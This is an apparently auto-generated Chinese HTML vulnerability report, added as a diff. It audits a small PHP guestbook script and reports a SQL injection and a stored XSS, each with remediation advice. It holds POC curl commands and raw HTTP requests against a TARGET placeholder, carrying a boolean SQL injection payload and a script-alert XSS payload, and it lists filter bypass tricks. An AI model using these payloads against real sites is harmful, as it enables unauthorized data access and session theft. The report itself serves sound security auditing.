@@ -1,0 +1,71 @@
+<!doctype html>
+<html lang="zh-CN"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>落日二号漏洞报告 20261031-215116-ea564e</title>
+<style>
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Microsoft YaHei",sans-serif;margin:0;background:#f6f7f9;color:#1f2328;line-height:1.6}
+header{background:#0b1220;color:#fff;padding:28px 40px}
+header h1{margin:0 0 8px;font-size:26px} header p{margin:2px 0;color:#c9d1d9}
+main{max-width:1180px;margin:24px auto;padding:0 20px}
+.cards{display:flex;gap:14px;flex-wrap:wrap;margin:18px 0}
+.card{background:#fff;border:1px solid #d8dee4;border-radius:10px;padding:18px 20px;margin:18px 0;box-shadow:0 1px 2px rgba(0,0,0,.04)}
+.metric{background:#fff;border:1px solid #d8dee4;border-radius:10px;padding:12px 16px;min-width:120px}
+.metric b{display:block;font-size:24px}
+table{width:100%;border-collapse:collapse;margin:10px 0 16px;font-size:14px}
+th,td{border:1px solid #d8dee4;padding:8px 10px;text-align:left;vertical-align:top}
+th{background:#f0f3f6}
+pre{background:#0b1220;color:#d1f0d1;padding:12px;border-radius:8px;overflow:auto;font-size:13px}
+code{font-family:ui-monospace,SFMono-Regular,Consolas,monospace}
+.muted{color:#59636e;font-size:13px}
+.sev{display:inline-block;padding:1px 8px;border-radius:999px;color:#fff;font-size:12px}
+.sev-critical{background:#a40e26} .sev-high{background:#cf222e} .sev-medium{background:#bf8700} .sev-low{background:#6e7781}
+a{color:#0969da}
+</style></head><body>
+<header><h1>落日二号漏洞挖掘报告</h1>
+<p>run_id: 20261031-215116-ea564e · 生成时间: 2026-10-31T13:52:06.210398+00:00</p>
+<p>输入: $WORKSPACE\暴风星云裂\057.zip · SHA256: e5aacb8c730b8fc545d6f2efe30ad90b9aa52a5009f9f368746231c2685d2e23</p></header>
+<main>
+<div class="cards">
+<div class="metric"><b>2</b>findings</div>
+<div class="metric"><b>2</b>含 POC</div>
+<div class="metric"><b>0</b>二次注入链</div>
+<div class="metric"><b>0</b>Prompt 注入迹象</div>
+</div>
+<section class="card"><h2>执行摘要</h2><p>本次汇总基于单文件 PHP 脚本 057.php（24 行）的源码审计，共交付 2 条已去重 findings，均带 POC 文本（静态构造，未执行、未动态验证）。最高危为 GEN-71dd317be73f：057.php 第 19 行留言板 INSERT 语句存在 SQL 注入（CWE-89，critical，rule 来源）；其次为 LLM-b34cfec2b4e0：同一文件第 19 行 name 字段的存储型 XSS（medium，str_replace 黑名单可绕过，llm_inferred）。两条 POC 均为文本工件，SQL 注入 POC 未使用 DROP 等破坏性语句，目标统一以 TARGET 占位，仅限授权测试。攻击面测绘显示该文件 source 热点在第 3 行、sink 热点在第 1 行，但 findings 实际落在第 19 行，说明测绘热点与真实污点路径存在偏差，第 1/3 行的 include/命令执行/路径拼接等假设未被 findings 证实，需人工复核。</p>
+<p class="muted">本报告为结构化静态分析结果；未执行 POC、未搭建沙箱。完整机器可读数据见 report.json / report.sarif。</p></section>
+<section class="card"><h2>Findings</h2>
+<table><thead><tr><th>#</th><th>严重度</th><th>类型</th><th>标题</th><th>位置</th><th>置信度</th><th>POC</th></tr></thead>
+<tbody><tr><td>1</td><td><span class='sev sev-critical'>critical</span></td><td><code>sql_injection</code></td><td>057.php 留言板 INSERT 语句 SQL 注入（CWE-89）</td><td><code>057.php:19</code></td><td>0.78</td><td>是</td></tr><tr><td>2</td><td><span class='sev sev-medium'>medium</span></td><td><code>xss</code></td><td>057.php 留言板 name 字段存储型 XSS（str_replace 黑名单可绕过）</td><td><code>057.php:19</code></td><td>0.62</td><td>是</td></tr></tbody></table></section>
+<section class='card' id='GEN-71dd317be73f'><h2>F-1 057.php 留言板 INSERT 语句 SQL 注入（CWE-89）</h2><p><span class='sev sev-critical'>critical</span> <code>sql_injection</code> / CWE-89 · 置信度 0.78 · candidate / rule_verified+llm</p><p><b>位置：</b><code>057.php:17-19</code></p><p>攻击者通过 HTTP 请求向 057.php 提交留言表单，外部输入在 057.php:5 被读入变量 $message（候选标注为 query `mtxMessage`，即留言内容字段）。该值未经任何转义或参数化，在 057.php:18 被直接拼接进 SQL 字符串：$query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;;，随后在 057.php:19 交由 mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) 执行。由于 $message 位于单引号字符串字面量内部，攻击者只需闭合单引号即可注入任意 SQL 片段（例如在 comment 值中构造 &#x27; , (SELECT ...))-- - 之类的载荷），从而改写 INSERT 的列值或追加子查询。代码中未见 mysqli_real_escape_string、预处理语句或白名单校验，因此校验完全缺失。此外 057.php:19 的 or die(...) 分支会把 mysqli_error() 的原始错误信息回显到页面，为报错型注入和数据库结构探测提供了直接反馈通道。</p><p><b>影响：</b>数据库写入被任意篡改：可向 guestbook 表插入伪造记录、通过子查询读取其他表数据（如用户表、凭据）并借助报错回显外带，造成敏感数据泄露；在数据库账户权限较高时可进一步读写文件或影响其他业务表，属于数据完整性与机密性双重破坏。</p><p><b>CVE/CWE 论证：</b>CWE-89（SQL 命令中特殊元素未正确中和）。外部可达性：057.php 为可直接 HTTP 访问的留言提交端点，无需认证即可提交表单；利用链闭合：057.php:5 读取外部输入 → 057.php:18 字符串拼接构造 $query → 057.php:19 mysqli_query 执行，中间无净化函数，且错误信息回显降低了利用门槛。证据等级为源码推断（llm_inferred），未做动态验证。</p><p><b>修复建议：</b>改用预处理语句与参数绑定：$stmt = mysqli_prepare($link, &quot;INSERT INTO guestbook (comment, name) VALUES (?, ?)&quot;); mysqli_stmt_bind_param($stmt, &#x27;ss&#x27;, $message, $name); mysqli_stmt_execute($stmt);。若必须保留拼接，至少对 $message、$name 使用 mysqli_real_escape_string 并配合严格字符白名单与长度限制。同时移除 or die(mysqli_error(...)) 的原始错误回显，改为记录服务端日志并返回通用错误页；数据库账户按最小权限授予，仅保留对 guestbook 表的 INSERT 权限。</p><h3>利用链</h3><table><thead><tr><th>#</th><th>位置</th><th>描述</th><th>数据状态</th><th>绕过原因</th></tr></thead><tbody><tr><td>1</td><td><code>057.php:5</code></td><td>从 query `mtxMessage` 读取外部输入</td><td>污点进入 query</td><td></td></tr><tr><td>2</td><td><code>057.php:19</code></td><td>危险汇点：$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</td><td>污点进入 sql_injection 汇点</td><td>未发现有效净化/参数化</td></tr></tbody></table><h3>POC</h3><p>针对 /057（POST）的 SQL 注入 POC。注入点：POST 参数 mtxMessage；payload 使用 TARGET 占位符。</p><ol><li><b>确认目标可达且已获授权</b><pre>curl -sS -i &#x27;http://TARGET:8080/057&#x27;</pre><div class='muted'>预期：返回应用页面/接口响应，而不是连接失败</div></li><li><b>发送 SQL 注入 载荷</b><pre>curl -sS -i -X POST &#x27;http://TARGET:8080/057&#x27; \
+  -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \
+  --data &#x27;mtxMessage=%27%20OR%20%271%27%3D%271&amp;Submit=Submit&#x27;</pre><div class='muted'>预期：布尔条件改变响应内容/长度，或触发 SQL 报错、时间延迟。</div></li><li><b>记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道</b><div class='muted'>预期：出现与基线不同的内容、状态码、延迟或副作用</div></li></ol><details><summary>POC 脚本</summary><h4>poc.sh</h4><pre>#!/usr/bin/env sh
+set -eu
+# 仅限授权测试；替换 TARGET 后手动执行
+curl -sS -i -X POST &#x27;http://TARGET:8080/057&#x27; \
+  -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \
+  --data &#x27;mtxMessage=%27%20OR%20%271%27%3D%271&amp;Submit=Submit&#x27;
+</pre><h4>request.http</h4><pre>POST /057 HTTP/1.1
+Host: TARGET:8080
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 50
+
+mtxMessage=%27%20OR%20%271%27%3D%271&amp;Submit=Submit
+</pre></details><p class='muted'>执行状态：未执行；POC 仅为文本工件，仅限授权测试。</p></section><section class='card' id='LLM-b34cfec2b4e0'><h2>F-2 057.php 留言板 name 字段存储型 XSS（str_replace 黑名单可绕过）</h2><p><span class='sev sev-medium'>medium</span> <code>xss</code> / CWE-79 · 置信度 0.62 · candidate / llm_inferred</p><p><b>位置：</b><code>057.php:14-19</code></p><p>057.php 第 3-6 行从 $_POST 读取 btnSign/mtxMessage/txtName，第 14 行对 $name 仅用 str_replace(&#x27;&lt;script&gt;&#x27;,&#x27;&#x27;) 做单次黑名单替换，第 15 行 mysqli_real_escape_string 只处理 SQL 转义、对 HTML 语义无效，第 18-19 行将 $name 原样拼入 INSERT 语句写入 guestbook 表。由于黑名单只匹配小写 &#x27;&lt;script&gt;&#x27; 且只替换一次，攻击者可用大小写混写（&lt;ScRiPt&gt;）、嵌套构造（&lt;scr&lt;script&gt;ipt&gt;，替换后重新拼出 &lt;script&gt;）或其它标签/事件属性（&lt;img src=x onerror=...&gt;、&lt;svg onload=...&gt;）绕过，留言被后续页面渲染时在浏览器执行，构成存储型 XSS。</p><p><b>影响：</b>存储型 XSS，可在访客/管理员浏览器执行脚本，窃取会话或触发敏感操作</p><p><b>CVE/CWE 论证：</b>CWE-79；外部未认证可达，黑名单绕过链在源码中闭合</p><p><b>修复建议：</b>输出侧按上下文做 HTML 实体编码，移除基于黑名单的输入过滤，使用 CSP</p><h3>利用链</h3><table><thead><tr><th>#</th><th>位置</th><th>描述</th><th>数据状态</th><th>绕过原因</th></tr></thead><tbody><tr><td>1</td><td><code>057.php:3</code></td><td>检测到 btnSign 提交，进入处理分支</td><td>外部请求进入</td><td></td></tr><tr><td>2</td><td><code>057.php:6</code></td><td>读取 txtName 并 trim</td><td>$name = 攻击者可控字符串</td><td></td></tr><tr><td>3</td><td><code>057.php:14</code></td><td>仅 str_replace(&#x27;&lt;script&gt;&#x27;,&#x27;&#x27;) 单次小写黑名单替换</td><td>$name 仍含可执行 HTML（大小写/嵌套/事件属性）</td><td>黑名单只匹配小写且单次替换，可用 &lt;ScRiPt&gt;、&lt;scr&lt;script&gt;ipt&gt;、&lt;img onerror&gt; 绕过</td></tr><tr><td>4</td><td><code>057.php:15</code></td><td>mysqli_real_escape_string 仅做 SQL 转义，不改变 HTML 语义</td><td>$name 保留 HTML 标签</td><td></td></tr><tr><td>5</td><td><code>057.php:18-19</code></td><td>拼接 INSERT 并执行，持久化到 guestbook 表</td><td>恶意 HTML 存入数据库</td><td></td></tr></tbody></table><h3>POC</h3><p>针对 /057.php（POST）的 跨站脚本 POC。注入点：POST 参数 txtName；payload 使用 TARGET 占位符。</p><ol><li><b>确认目标可达且已获授权</b><pre>curl -sS -i &#x27;http://TARGET:8080/057.php&#x27;</pre><div class='muted'>预期：返回应用页面/接口响应，而不是连接失败</div></li><li><b>发送 跨站脚本 载荷</b><pre>curl -sS -i -X POST &#x27;http://TARGET:8080/057.php&#x27; \
+  -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \
+  --data &#x27;txtName=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&#x27;</pre><div class='muted'>预期：响应中脚本未编码，浏览器执行并弹出 document.domain。</div></li><li><b>记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道</b><div class='muted'>预期：出现与基线不同的内容、状态码、延迟或副作用</div></li></ol><details><summary>POC 脚本</summary><h4>poc.sh</h4><pre>#!/usr/bin/env sh
+set -eu
+# 仅限授权测试；替换 TARGET 后手动执行
+curl -sS -i -X POST &#x27;http://TARGET:8080/057.php&#x27; \
+  -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \
+  --data &#x27;txtName=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&#x27;
+</pre><h4>request.http</h4><pre>POST /057.php HTTP/1.1
+Host: TARGET:8080
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 61
+
+txtName=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+</pre></details><p class='muted'>执行状态：未执行；POC 仅为文本工件，仅限授权测试。</p></section>
+<section class="card"><h2>限制</h2><ul><li>只做源码静态分析，不构建、不部署、不执行 POC、不搭建沙箱。</li><li>finding 的 verdict 为 candidate 或 external，不是动态确认。</li><li>POC 仅为文本工件，目标使用 TARGET 占位符，仅限授权测试。</li><li>规则为轻量级启发式，复杂控制流/常量传播/跨文件调用可能漏报或误报。</li><li>AWVS 是外部动态扫描器，结果只作为佐证；本管线不执行 AWVS 扫描。</li></ul></section>
+</main></body></html>
